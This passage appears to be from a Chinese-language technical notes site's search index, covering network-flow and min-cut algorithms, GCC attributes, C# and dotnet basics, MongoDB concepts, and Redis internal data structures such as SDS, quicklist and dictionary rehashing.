\u0026lt;= n; v++) if (!a[v] \u0026amp;\u0026amp; cap[u][v] \u0026gt; flow[u][v]) { p[v] = u; q.push(v); a[v] = a[u] \u0026lt;? cap[u][v] - flow[u][v]; } } if (a[t] === 0) break; for (int u = t; u != s; u = p[u]) { flow[p[u]][u] += a[t]; flow[u][p[u]] -= a[t]; } f += a[t]; } 其中 a[i] 表示在当前路径下，从源节点 s 到 i 的最小残量，那么 a[t] 就是整个链路的最小残量。\n最小割最大流定理 #  割：\n 把图的所有顶点分成 S、T 两个集合，其中 $$s \\in S, t \\in T$$，把集合 $${e = (u, v)| u \\in S, v \\in T}$$ 中的所有边删除，就无法从 s 达到 t 了。 我们把这样的集合划分方式称为一个 s-t 的割。  一个割的容量可以定义为：$$\\displaystyle c(S, T) = \\sum_{u \\in S, v \\in T} c(u, v)$$，求容量最小割的问题即最小割问题。\n最小割最大流定理：\n  在增广路算法中，循环结束的条件是找不到一个从 s 到 t 的路径，在最后一个循环周期中，从 s 通过 BFS 到达过的节点可以组成一个集合 S，它与剩下节点的集合 T 就构成一个 s-t 割；\n  通过上面的映射关系从最大流映射到的割，就是最小割；\n  证明：通过 $$|f| \\le c(S, T)$$\n最小费用最大流问题 #  建模时可以用负数表示容量，使用 Bellman-Ford 算法而不是 BFS。\n全图最小割 #   参考：\n https://www.zhihu.com/question/265186138/answer/290726001 https://en.wikipedia.org/wiki/Stoer%E2%80%93Wagner_algorithm   全局最小割（或“全局割”）即图的所有割中，容量最小的割成为这个图的全局最小割。\n随机算法 Karger\u0026rsquo;s Algorithm：\n 算法描述：对一个图 $$G = (V, E)$$，随机选择图中的一条边 $$e = (v_1, v_2) \\in E$$，对这条边链接的两个点 $$v_1, v_2$$ 进行“缩点”，知道图中只剩下两个点，这两个点对应着原图的一个割。随机执行多次之后可以找到概率上的最小割。 概率计算：即每次缩点结束后得到的割，是原图的最小割的概率是多少：  设图的最小割中，两个集合之间的边集为 $$E'$$，那么考虑随机算法的第一步，成功的概率为 $$\\displaystyle 1 - \\frac{|E'|}{|E|}$$； 因为边集 $$E'$$ 构成的割是原图最小割，每个节点的度都应该小于他的势，那么一定满足条件 $$\\displaystyle \\sum_{v \\in V}|E'| \\le 2|E| \\Rightarrow |E| \\ge \\frac{|V||E'|}{2} $$ 综合以上两个不等式，对第一次成功的概率有不等式：$$\\displaystyle p_{first} = 1 - \\frac{|E'|}{|E|} \\ge 1 - \\frac{2 |E'|}{|V| |E'|} = 1 - \\frac{2}{|V|}$$ 上面的概率不等式与 $$|E'|$$ 无关的，所以我们可以递归地计算综合概率：$$\\displaystyle p_n \\ge (1 - \\frac{2}{|V|}) p_{n-1} = \\prod_{i = 0}^{n-3}\\frac{|V| - i - 2}{|V| - i} = \\frac{1}{C_{|V|}^2}$$   时间复杂度计算：考虑执行 $$T = C_{|V|}^2 \\ln{|V|}$$ 次随机的计算：  可以认为 $$C^{2}{n}$$ 是一个极大的数字，在进行了 T 次计算后失败概率 $$\\displaystyle (1 - \\frac{1}{C{|V|}^2})^{C_{|V|}^2 \\ln{|V|}} \\rightarrow (\\frac{1}{e})^{\\ln{|V|}} = \\frac{1}{|V|}$$ 执行 T 次计算的总时间复杂度为：$$O(T |E|) \\approx |V|^2 |E| \\ln{|V|}$$    迭代算法 Stoer-Wagner Algorithm：\n 算法描述：对于一个图 $$G = (V, E)$$：  随机初始化一个点集 $$A = { v | v \\in V }$$，依次将缩点成本（$\\displaystyle v \\in V/A \\rightarrow \\sum_{u \\in A, uv \\in E} w(uv)$）最大的点加入点集； 直到加入倒数第二个点 $v_{penult}$，剩下最后一个点 $$v_{last}$$，那么 $v_{penult}-v_{last}$ 的最小割即 ${v | v \\in A, v \\not= v_{last}}, {v_{last}}$ 重复前面两个步骤 $|V| - 1$ 次，每次可以得到一个最小割，这些最小割中最小的即全局最小割；    "},{"id":251,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/cpp/attribute/","title":"Attribute","section":"Cplusplus","content":"__attribute__ #  C++ 中的 __attribute__ 是 GNU 为 C 语言提供的一项机制，它允许开发者向函数、变量添加一些特征以方便错误检查。下面是几个使用 __attribute__ 的例子，更完整的使用示例可以查看 GNU 官方文档\nunused #  Gcc 编译器有一个特性，如果在编译时加入 -Wall（显示所有的警告）这个参数，则会将没有使用过的变量、函数作为警告抛出。\n但是有时我们需要故意地，声明一个变量不会被使用，于是我们可以使用 unused。一个被标记了 unused 属性的变量或者函数，不会抛出未使用警告。\n比如我们有时会用到 main 函数中的 argv 参数，不会用到 argc 参数所以我们可以把它们标记为 unused：\nint main(int argc __attribute__((unused)), char **argv) { /* code that uses argv, but not argc */ } PostScript：\n 与之相反，我们也会有一个 used 的属性标记。  format #  像 printf 与 scanf 这样的函数，需要格式化字符串与动态参数，我们有时需要确定参数的合法性。\n比如我们定义了一个函数：\n#include\u0026lt;stdarg.h\u0026gt;void printfBy(int flag, const char *format, ...) { if(flag){ va_list args; va_start(args, format); vprintf(format, args); va_end(args); } } 我们希望编译器可以在编译的时候告诉我们参数是否传递错误，我们可以在引用这个函数时，给函数添加一个 format 属性：\nextern void printfBy(int flag, const char *format, ...) __attribute__((format(printf, 2, 3)));   指定 format 有以下两种格式：\n__attribute__((format(printf, m, n))); __attribute__((format(scanf, m, n)));   其中 m 这个参数表示格式化字符串所在的位置，n 表示动态参数开始的位置。\n  noreturn #  这个属性告诉编译器，指定一个函数不会返回。典型地比如 C 标准库中的 exit() 与 abort() 函数：\nextern void exit(int) __attribute__((noreturn)); extern void abort(void) __attribute__((noreturn)); 如果编译器编译时，检测到了返回的路径，则会抛出警告。\n"},{"id":252,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/cpp/stl/","title":"Stl","section":"Cplusplus","content":" 参考：\n https://stackoverflow.com/questions/6292332/what-really-is-a-deque-in-stl   STL #  Deque #  Deque 的全称是 double ended queue，两端结束队列；\n它是 stack 与 queque 的底层存储结构，它的实现基于 vector 的实现，它结构大致如下：\n可以看到这样存储的优点是：\n 仍然可以通过接近与 O(1) 常数级别的时间复杂度进行访问； 在两端的插入删除复杂度仍然为 O(1)；  对于 stack 与 queue 这样的仅仅在双端有插入删除访问操作的数据结构，是一个合适的基类；\n"},{"id":253,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/cpp/%E9%9D%A2%E8%AF%95%E5%A4%8D%E4%B9%A0/","title":"面试复习","section":"Cplusplus","content":" 复习地址:\n https://github.com/huihut/interview   C++ 知识结构系统梳理 #  关键字 #  零碎知识 #  面向对象 #   有关虚函数指针和虚函数表的资料：https://blog.twofei.com/496/\n  如何定义一个只能分配在栈（堆）上的类：https://www.nowcoder.com/questionTerminal/0a584aa13f804f3ea72b442a065a7618\n 智能指针 #  智能指针定义在头文件 memory 中。\n强制类型转换 #  "},{"id":254,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/csharp/1.%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/","title":"1.基本介绍","section":"CSharp","content":"C# 简介 #  通过菜鸟教程学习：\n https://www.runoob.com/csharp/csharp-intro.html  C# 提供的一些功能如下：\n 布尔条件（Boolean Conditions） 自动垃圾回收（Automatic Garbage Collection） 标准库（Standard Library） 组件版本（Assembly Versioning） 属性（Properties）和事件（Events） 委托（Delegates）和事件管理（Events Management） 易于使用的泛型（Generics） 索引器（Indexers） 条件编译（Conditional Compilation） 简单的多线程（Multithreading） LINQ 和 Lambda 表达式 集成 Windows  "},{"id":255,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/csharp/2.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"2.基本语法","section":"CSharp","content":"基本语法 #  数据类型 #  在 C# 中，变量分为以下几种类型：值类型（Value types）、引用类型（Reference types）、指针类型（Pointer types）\n值类型 #  值类型都是从类 System.ValueType 中派生的。值类型直接用来存储数据。\n下面是常见的值类型：\n   类型 描述 范围 默认值     bool 布尔值 True 或 False False   byte 8 位无符号整数 0 到 255 0   char 16 位 Unicode 字符 U +0000 到 U +ffff \u0026lsquo;\\0\u0026rsquo;   decimal 128 位精确的十进制值，28-29 有效位数 (-7.9 x 1028 到 7.9 x 1028) / 100 到 28 0.0M   double 64 位双精度浮点型 (+/-)5.0 x 10-324 到 (+/-)1.7 x 10308 0.0D   float 32 位单精度浮点型 -3.4 x 1038 到 + 3.4 x 1038 0.0F   int 32 位有符号整数类型 -2,147,483,648 到 2,147,483,647 0   long 64 位有符号整数类型 -9,223,372,036,854,775,808 到 9,223,372,036,854,775,807 0L   sbyte 8 位有符号整数类型 -128 到 127 0   short 16 位有符号整数类型 -32,768 到 32,767 0   uint 32 位无符号整数类型 0 到 4,294,967,295 0   ulong 64 位无符号整数类型 0 到 18,446,744,073,709,551,615 0   ushort 16 位无符号整数类型 0 到 65,535 0    如果想要得到某个类型在运行平台上的大小，可以使用 sizeof 方法。\n引用类型 #  引用类型不包含存储在变量中的实际数据，但它们包含对变量的引用。多个引用类型可能指向同一个物理位置，因此如果某一个变量的数据发生改变，其他的变量也会发生改变。\nC# 内置的引用类型有 object、dynamic、string。\n  object 即 System.Object，对象是 C# 的通用类型系统（Common Type Stream: CTS）。\n当一个值类型转换为对象类型时，则被称为 装箱；另一方面，当一个对象类型转换为值类型时，则被称为 拆箱。\nobject obj;\t// 声明对象类型变量 obj = 100;\t// 装箱   dynamic 动态类型，动态类型的变量可以存储任何类型的值。这些变量的类型检查在运行时发生。\ndynamic dyn = value;\t// 声明动态类型变量   string 字符串类型。字符串有两种声明方式，普通引号声明与 @ 引导声明。\nString str1 = \u0026#34;Hello World\u0026#34;; // 普通引导声明，与 C++ 语法相同  String str2 = @\u0026#34;script type=\u0026#34;\u0026#34;text/javascript\u0026#34;\u0026#34;\u0026gt; \u0026lt;!-- --\u0026gt; \u0026lt;/script\u0026gt;\u0026#34;;\t// @引导声明，可以直接写入 \\,\\n 这些字符   指针类型 #  指针类型变量存储另一种类型的内存地址。C# 中的指针与 C 或 C++ 中的指针有相同的功能。\n"},{"id":256,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/csharp/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B/","title":"从零开始","section":"CSharp","content":" 参考文档：\n  https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-restore\n  https://docs.microsoft.com/zh-cn/dotnet/core/tools/dotnet-msbuild\n   从零开始 #   如何从零开始，使用命令行构建并运行一个 C# 的项目，并且运行一个程序？\n 项目结构 #  运行一个项目至少需要一个 xml 格式的项目文件 {项目名}.csproj 和一个源代码文件 {文件名}.cs。了解这个，有助于我们使用 git 管理自己的项目代码。\n我们在 Visual Studio 里面创建一个 .Net 在 Windows 上的桌面控制台应用。\n下面是官方默认生成的 HelloWorld.csproj：\n\u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;OutputType\u0026gt;Exe\u0026lt;/OutputType\u0026gt; \u0026lt;TargetFramework\u0026gt;netcoreapp3.1\u0026lt;/TargetFramework\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;/Project\u0026gt;  这个是项目的配置信息 上面这个 xml 指明了项目使用的 SDK（Microsoft.NET.Sdk）、输出的文件类型（可执行 exe 文件）、.NET 版本。  下面是官方默认生成的 Program.cs：\nusing System; namespace HelloWorld { class Program { static void Main() { Console.WriteLine(\u0026#34;Hello World!\u0026#34;); } } }  详细的语言语法细节在这里不阐述。  运行 #  除了在 Visual Studio 中点击执行之外，我们也可以自己使用命令行自己编译并且执行目标文件。\nC# 的命令行指令是 dotnet，运行一个项目分为三个步骤：\n  恢复，使用 NuGet 恢复通过在项目文件中指定的项目的依赖项。比如上面的例子，NuGet 就会为我们恢复 SDK 中的内容。在项目代码同级目录下，执行以下命令：\n$ dotnet restore 执行完这个命令后，会发现目录下出现了 obj/ 这个文件夹，最关键的文件是这个文件夹中的 project.assets.json。\n  编译，编译的指令是 msbuild：\n$ dotnet msbuild 这个是 dotnet 提供的最下层的命令，允许指定完备的编译选项。\n  运行。编译指令默认会把可执行文件放在 bin/\u0026lt;configuration\u0026gt;/\u0026lt;target\u0026gt; 中，比如在上面的例子中，会把可执行文件放在 obj/Debug/netcoreapp3.1/HelloWorld.exe，于是可以直接执行这个文件：\n$ ./obj/Debug/netcoreapp3.1/HelloWorld.exe   另外，dotnet 提供了一些更加便捷的命令：\n  build 命令会隐式执行 restore 之后，执行 msbuild：\n$ dotnet build # Equivalent To: # dotnet msbuild -restore   run 命令会隐式执行 restore、msbuild 之后执行运行操作：\n$ dotnet run 也就是说，只要有项目文件与源代码，直接执行这个命令即可运行。\n  "},{"id":257,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/mongodb/%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D/","title":"原理介绍","section":"MongoDB","content":"原理介绍 #   参考资料：https://zhuanlan.zhihu.com/p/87722764\n 简介 #  MongoDB 是最受欢迎的 NoSQL 数据库，文档数据库排名第一位，在所有数据库引擎中排名第五位（Oracle、MySQL、Microsoft-SQL-Server、Postgre SQL）。\n了解 MongoDB 的发展历史可以查看 这篇文章。\n特性 #  以下是 MongoDB 的一些特性：\n  面向文档存储，基于 JSON/BSON 可表示灵活的数据结构。因此与 javascript 有天生的兼容性，nodejs 服务则倾向于使用 mongodb 作为其底层数据结构；\n  动态 DDL 能力，没有强 Schema 约束，支持快速迭代。同样也于 javascript 脚本语言的变量无类型性吻合。\n  高性能计算，提供基于内存的快速数据查询；\n  容易扩展，利用数据分片可以支持海量数据存储；\n  丰富的功能集，支持二级索引、强大的聚合管道功能，为开发者量身定做的功能，如数据自动老化、固定集合等等。\n  跨平台版本、支持多语言SDK。\n  基本模型 #  基本概念与操作 #  MongoDB 是最像关系型数据库的文档型数据库，为了实现关系型数据库的一些模型，MongoDB 自己定义了一些概念。\n   RDBMS 概念 MongoDB 概念     database database。与 RDB 相同，表示表的集合。   table collection：一个 collection 可以存放多个文档。 不同之处在于 collection 的 schema 是动态的，不需要预先声明一个严格的表结构。更重要的是，默认情况下 MongoDB 并不会对写入的数据做任何schema 的校验。   row document：相当于 RDB 中的“行”，一个文档由多个字段（列）组成，并采用bson 格式表示（下面阐述）。   column field：相当于 RDB 中的“列”，相比普通column的差别在于field的类型可以更加灵活，比如支持嵌套的文档、数组。   view view：在 MongoDB3.4 之后实现了与关系型数据库基本相同的视图功能。它既可以是虚拟的，也可以是物理的视图。    对于字段，关系型数据库中有一些特殊类型的字段，它们在 MongoDB 中的映射关系如下：\n   RDBMS 字段 MongoDB 字段     主键 _id：MongoDB 用一种统一的分布式算法来实现这个字段的唯一性。   外键 refrence：不同的是 MongoDB 并没有实现任何的约束检查功能。   索引 index：与关系型数据库中索引的作用相同。后文详细阐述。    对于 SQL 中的一些操作，在 MongoDB 的 API 中也有类似的方法实现：\n   SQL 操作 MongoDB 操作     join $lookup：一个聚合操作符，可以实现类似 SQL-Join 的功能   trransaction MongoDB 4.0 开始支持事务的支持   group by aggregation：MongoDB 通过 aggregation 提供的了强大的聚合计算框架。    PS：MongoDB 使用 SQL 进行查询需要借助第三方工具如 mongobooster、studio3t。\n数据类型与主键 #  Bson 数据类型：\n  MongDB 的文档（即 SQL 中的行）可以使用 Js 的对象表示，从格式上讲是一种基于 Json 的叫 Bson（Binary Json） 的格式。\n  Bson 可以被认为是一种 Json 的扩展结构，它支持出了 Json 支持的基本数据类型之外的日期、正则表达式等类型。\n  分布式 ID：\n 分布式 ID 算法是为了保证分布式数据的唯一性而诞生的一种算法。其中最有名的是 Twitter 研发的 snowflake 雪花算法，它同时使用“时间戳”、“机器号”、“进程号”、“随机数”来实现唯一性。 而 MongoDB 的分布式 ID 算法则将随机数一部分替换为了初始化随机的自增 counter；  索引 #  索引是一个数据库的关键能力，它的技术实现依赖于底层的存储引擎，MongoDB 使用 wiredTiger 作为默认的存储引擎。\nMongoDB 的索引在实现上使用了 B+ 树的结构，这与其他的传统数据库没有什么区别。\n评估与调优：\n 使用 explain 方法可以用于对查询计划进行分析并且进一步评估索引的结果。进一步了解可以参考这篇文档。  分布式集群 #  在讨论一个分布式集群时，通常通过描述以下这些方案的实现来讨论：“数据分片”、“数据备份”、“服务检测”等。\n数据分片 #  将键空间根据一定的算法分布到不同的分布式节点上存储的方法，称为数据分片。而 MongoDB 支持两种分片方式：\n “范围分片”、“哈希分片”。  由于考虑到在分布式系统中经常出现的单点故障或者出现新增加服务器，使用一致性哈希算法是更合理的解决方案：\n  一致性哈希算法一般满足四个条件：“平衡性”（所有提供可用的服务管理的键值空间是大致相等的）、“单调性”（如果有新的服务加入系统，所有需要发生变更的数据都是变更到新的缓冲区）、“分散性”、“负载”、“平滑性”；\n  分布式系统的一致性哈希算法最早在论文《Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web》中提出。\n  为了保证数据在各个服务器上复杂的均衡性：\n MongoDB 提供了 “全预分配”、“非预分配” 两种方案； 当使用后者策略时，不均衡状态会通过集群均衡器进行检测，一旦发现了不均衡则会执行数据迁移达到均衡； 上面的数据迁移会对 MongoDB 集群的性能产生一定的影响，目前的规避手段只是将均衡窗口对齐到闲暇时段。  数据备份 #  通过与 Redis 类似的主从节点集实现，从节点从主节点备份数据。\n当分布式系统检测到主节点宕机时，将会通过 Raft 算法选举出一个新的主节点进行升级。\n数据检测 #  通过心跳链接检测分布式系统中单个主机的存活性。\n"},{"id":258,"href":"/docs/%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF/database/redis/1.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AF%B9%E8%B1%A1/","title":"1.数据结构与对象","section":"Redis","content":"第一部分：数据结构与对象 #   因为阅读的书已经较为过时，新的数据结构没有完全讲完，比如：\n zipmap、quicklist、stream   字符串 (Simple Dynamic String) #  Redis 没有使用 C 语言中的 \\0 结尾的方式表示一个字符串，而是自己构建了一个结构 SDS 作为基本字符串类型。这一结构的定义和实现分别在源码的 src/sds.h、src/sds.c 这两个文件中。\n结构 #  以最长 256 字节长度串的结构 sdshdr8 为例：\nstruct __attribute__ ((__packed__)) sdshdr8 { uint8_t len; /* used */ uint8_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[]; }; 由上面的源码可以看出 SDS 结构的核心是：\n  len：已经使用的字符串长度；\n  alloc：总共分配的缓冲区长度；\nSDS 为了兼容 C 语言的空字符串结尾，会额外分配一个字节的大小，如果假设字符串可以增加的大小为 rmd，那么有公式：alloc = rmd + len + 1；\n  buf：字符串字面量；\n  像大多数高级语言一样，使用简单动态字符串这种封装方式有以下好处：\n 获取字符串长度，时间复杂度 O(1)； 二进制安全：杜绝缓冲区溢出、可以存储二进制形式的字符串； 减少修改字符串所需要的内存重新分配次数； 兼容部分 C 字符串函数；  方法 #  sds 的创建核心方法可以看到源码中的 _sdsnewlen，它的函数签名如下：\nsds _sdsnewlen(const void *init, size_t initlen, int trymalloc) 在这个函数中可以看到 sds 的内存排列方式：\ns = (char*)sh+hdrlen; fp = ((unsigned char*)s)-1; usable = usable-hdrlen-1; 其中 s 就是 sds 结构中的 buf，并最终赋值给了 sds 结构指针；\n链表 (Linked List) #  普通双端链表 #  Redis 链表的底层是一个无环双向链表，结构可以在 src/adlink.h、src/adlink.c 这两个文件中看到。adlink 是 A Generic Doubly Linked List 的缩写。\n链表的节点使用结构 listNode：\ntypedef struct listNode { struct listNode *prev; struct listNode *next; void *value; } listNode; 链表本身使用结构 list：\ntypedef struct list { listNode *head; listNode *tail; void *(*dup)(void *ptr); void (*free)(void *ptr); int (*match)(void *ptr, void *key); unsigned long len; } list; 除了 头节点 head、尾节点 tail、以及链表长度 len，结构中另外三个是三个函数：\n dup 函数用于复制节点，free 函数用于释放节点、match 函数用于比较节点； 因为 listNode 的 value 可以指向任意对象，因此需要为 list 结构的实例设置三个用于操作节点的函数，这其实是一种多态的体现；  使用快速链表 #  Redis3.2，在 quicklist implementation 这个 PR 提交之后，Redis 实现链表这一数据对象的默认方式由 ziplist/linkedlist 变成了 quicklist。这种实现方式相对于之前的实现有以下的好处：\n 对于 linkedlist 实现的链表，容易形成很多内存碎片，查找的时间复杂度可以认为是 O(n)； 而对于 ziplist 实现的链表，每次执行插入删除操作时都会进行内存的重新分配；  快速链表 quicklist 的结构简单地说就是一个 ziplist 的 linkedlist。\n快速链表结构 #  quicklist 本身的结构：\n/* quicklist is a 40 byte struct (on 64-bit systems) describing a quicklist. * \u0026#39;count\u0026#39; is the number of total entries. * \u0026#39;len\u0026#39; is the number of quicklist nodes. * \u0026#39;compress\u0026#39; is: 0 if compression disabled, otherwise it\u0026#39;s the number * of quicklistNodes to leave uncompressed at ends of quicklist. * \u0026#39;fill\u0026#39; is the user-requested (or default) fill factor. * \u0026#39;bookmakrs are an optional feature that is used by realloc this struct, * so that they don\u0026#39;t consume memory when not used. */ typedef struct quicklist { quicklistNode *head; quicklistNode *tail; unsigned long count; /* total count of all entries in all ziplists */ unsigned long len; /* number of quicklistNodes */ int fill : QL_FILL_BITS; /* fill factor for individual nodes */ unsigned int compress : QL_COMP_BITS; /* depth of end nodes not to compress;0=off */ unsigned int bookmark_count: QL_BM_BITS; quicklistBookmark bookmarks[]; } quicklist; 其中，除了容易理解的几个参数之外：\n  fill 的默认值是 16，被注释为 fill factor，这是什么意思呢？可以在 .c 文件的 _quicklistNodeAllowInsert 函数最后三行得知：\nif ((int)node-\u0026gt;count \u0026lt; fill) return 1; else return 0; 这也就是说，单个节点的长度不超过 fill 才可以继续执行插入，所以 fill 表征的是这些 ziplist 的大小；\n  compress 的默认值也为 16，注释里说它是没有被压缩的节点数量。具体可以在 __quicklistCompress 这个函数中看到 compress 这个变量的具体使用方式：\nquicklistNode *forward = quicklist-\u0026gt;head; quicklistNode *reverse = quicklist-\u0026gt;tail; int depth = 0; int in_depth = 0; while (depth++ \u0026lt; quicklist-\u0026gt;compress) { quicklistDecompressNode(forward); quicklistDecompressNode(reverse); if (forward == node || reverse == node) in_depth = 1; /* We passed into compress depth of opposite side of the quicklist * so there\u0026#39;s no need to compress anything and we can exit. */ if (forward == reverse || forward-\u0026gt;next == reverse) return; forward = forward-\u0026gt;next; reverse = reverse-\u0026gt;prev; } 举个例子说如果一个 quicklist 的长度为 20，compress 的值为 2，那么第 0、1、18、19 这四个 quicklistNode 则是没有压缩的；\n  bookmarks 与 bookmark_count 是一个为了加速访问的，面向 Redis 使用者的工具，它提供了以 O(1) 到达某个具体位置的能力。\n  Bookmark 的使用可以查看它结构定义位置的注释：\n/* Bookmarks are padded with realloc at the end of of the quicklist struct. * They should only be used for very big lists if thousands of nodes were the * excess memory usage is negligible, and there\u0026#39;s a real need to iterate on them * in portions. * When not used, they don\u0026#39;t add any memory overhead, but when used and then * deleted, some overhead remains (to avoid resonance). * The number of bookmarks used should be kept to minimum since it also adds * overhead on node deletion (searching for a bookmark to update). */ typedef struct quicklistBookmark { quicklistNode *node; char *name; } quicklistBookmark; 只有在 quicklist 特别大，而又有强烈的局部访问诉求时，才建议使用它。否则它不会增加 quicklist 的内存开销。\nquicklistNode 结构的定义如下：\n/* quicklistNode is a 32 byte struct describing a ziplist for a quicklist. * We use bit fields keep the quicklistNode at 32 bytes. * count: 16 bits, max 65536 (max zl bytes is 65k, so max count actually \u0026lt; 32k). * encoding: 2 bits, RAW=1, LZF=2. * container: 2 bits, NONE=1, ZIPLIST=2. * recompress: 1 bit, bool, true if node is temporary decompressed for usage. * attempted_compress: 1 bit, boolean, used for verifying during testing. * extra: 10 bits, free for future use; pads out the remainder of 32 bits */ typedef struct quicklistNode { struct quicklistNode *prev; struct quicklistNode *next; unsigned char *zl; unsigned int sz; /* ziplist size in bytes */ unsigned int count : 16; /* count of items in ziplist */ unsigned int encoding : 2; /* RAW==1 or LZF==2 */ unsigned int container : 2; /* NONE==1 or ZIPLIST==2 */ unsigned int recompress : 1; /* was this node previous compressed? */ unsigned int attempted_compress : 1; /* node can\u0026#39;t compress; too small */ unsigned int extra : 10; /* more bits to steal for future usage */ } quicklistNode; 注释中可以看出此处用的压缩方式是 lzf，它的压缩解压缩函数在 lzf_c.c - lzf_compress/lzf_d.c - lzf_decompress 这两个函数中。\n字典 (Hash Table) #  字典的结构与核心方法可以在 src/dict.c 与 src/dict.h 这两个文件中看到。\n结构 #  实现字典的结构中过程中，涉及了三个核心结构。\n字典本身使用 dict 这个结构实现的：\ntypedef struct dict { dictType *type; void *privdata; dictht ht[2]; long rehashidx; /* rehashing not in progress if rehashidx == -1 */ int16_t pauserehash; /* If \u0026gt;0 rehashing is paused (\u0026lt;0 indicates coding error) */ } dict;  跟 list 类似，其中 dictType 是一个为了实现多态的函数指针封装； dictht 结构才是实现字典的核心结构； dict 持有两个 dictht 并且定义了 rehashidx/rehashidx 这些成员变量，是为了 rehash 的性能与可用性的考虑；  哈希表使用 dictht 实现：\ntypedef struct dictht { dictEntry **table; unsigned long size; unsigned long sizemask; unsigned long used; } dictht; 其中 dictEntry 是以链式存储的哈希表节点：\ntypedef struct dictEntry { void *key; union { void *val; uint64_t u64; int64_t s64; double d; } v; struct dictEntry *next; } dictEntry; 通过 next 字段可以看出 dictEntry 的本质是一个链表的节点，哈希表通过这种方式解决哈希冲突；\n哈希算法 #  哈希算法是哈希表实现的重点，在代码的注释中可以看到，默认的哈希算法是 siphash，该算法在 siphash.c 这个文件中实现。\nRehash 大小 #  Redis 的哈希表设计巧妙之处正在于 Rehash 的方法实现。\n调整大小的核心方法是：\nint _dictExpand(dict *d, unsigned long size, int* malloc_failed) 查看这个方法的实现，可以知道函数通过 _dictNextPower 来计算预期的大小。这个方法中会根据 size 计算实际预期的大小，这个计算方法是：\nstatic unsigned long _dictNextPower(unsigned long size) { unsigned long i = DICT_HT_INITIAL_SIZE;\t// 4  if (size \u0026gt;= LONG_MAX) return LONG_MAX + 1LU; while(1) { if (i \u0026gt;= size) return i; i *= 2; } } 查看这个方法的调用，可以得到在什么条件下会触发 Rehash：\n/* Expand the hash table if needed */ static int _dictExpandIfNeeded(dict *d) { /// ... \t/* If we reached the 1:1 ratio, and we are allowed to resize the hash * table (global setting) or we should avoid it but the ratio between * elements/buckets is over the \u0026#34;safe\u0026#34; threshold, we resize doubling * the number of buckets. */ if (d-\u0026gt;ht[0].used \u0026gt;= d-\u0026gt;ht[0].size \u0026amp;\u0026amp; (dict_can_resize || d-\u0026gt;ht[0].used/d-\u0026gt;ht[0].size \u0026gt; dict_force_resize_ratio) \u0026amp;\u0026amp; dictTypeExpandAllowed(d)) { return dictExpand(d, d-\u0026gt;ht[0].used + 1); } /// ... } 而 _dictExpandIfNeeded 则会在每次使用 _dictKeyIndex 插入新的 key 时调用。\nRehash 流程 #  如果使用普通的 rehash 方案全局调整并且复制，在数据量较大的情况下，会导致服务器短暂的宕机。\n因此 Redis 设计了一个渐进式的 Rehash 方式，渐进式地多次完成，而不是集中地一次完成。具体的，在 Rehash 的过程中 ，dict 会存储两份 dictht 数据，所有的增删改查操作都会在这两个表中进行。\nRehash 的原子步骤是源码中的 dictRehash 这个方法，它的签名和注释如下：\n/* Performs N steps of incremental rehashing. Returns 1 if there are still * keys to move from the old to the new hash table, otherwise 0 is returned. * * Note that a rehashing step consists in moving a bucket (that may have more * than one key as we use chaining) from the old to the new hash table, however * since part of the hash table may be composed of empty spaces, it is not * guaranteed that this function will rehash even a single bucket, since it * will visit at max N*10 empty buckets in total, otherwise the amount of * work it does would be unbound and the function may block for a long time. */ int dictRehash(dict *d, int n) 在这个方法中，以 rehashidx 为标记，把之后连续的 n 个记录从 ht[0] 迁移到 ht[1]。每当一个元素从 ht[0] 迁移到 ht[1]，函数会更改 used 字段同时维持 size 字段不变，ht[0] 中对应下标位置的指针将会被指向为 NULL。\n查看这个函数的调用栈可以分析 Redis 具体是如何执行 Rehash 操作的。\n  dictRehashMilliseconds：函数接收一个以 ms 为单位的时间参数，函数内部每次 “迁移 100 个元素”为原子操作，进行执行时间不超过这个上限的 rehash。\n在 server.c 文件中通过调用这个函数进行 rehash 操作，每 100ms 会占用小于 1ms 时间进行 rehash。\n  /* Rehash in ms+\u0026#34;delta\u0026#34; milliseconds. The value of \u0026#34;delta\u0026#34; is larger * than 0, and is smaller than 1 in most cases. The exact upper bound * depends on the running time of dictRehash(d,100).*/ int dictRehashMilliseconds(dict *d, int ms) { if (d-\u0026gt;pauserehash \u0026gt; 0) return 0; long long start = timeInMilliseconds(); int rehashes = 0; while(dictRehash(d,100)) { rehashes += 100; if (timeInMilliseconds()-start \u0026gt; ms) break; } return rehashes; }  _dictRehashStep：对单步迁移操作的封装。\n该函数在添加删除查找等方法被执行时会用到，我感觉这么做的好处是可以将计算压力分摊到每次访问请求中，而基本不会影响每次访问的查询速度。同时间接地实现了“越被频繁使用的字典，计算优先级越高”；\u0010\n  PS：美团技术团队针对 Redis-Rehash 这一方向进行了优化：https://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html\nzipmap #  zipmap 名字叫 zip，实际上并没有进行压缩操作，它将键值对连续存储，省去了许多管理 map 的指针结构，它的大致结构可以在 zipmapNew 这个函数中看到：\nunsigned char *zipmapNew(void) { unsigned char *zm = zmalloc(2); zm[0] = 0; /* Length */ zm[1] = ZIPMAP_END; return zm; } 跳跃表 (Skip List) #   跳跃表最初在论文《Skip Lists: A Probabilistic Alternative to Balanced Trees》中提出，在 Redis 中的使用是这个数据结构的高光时刻。\n Redis 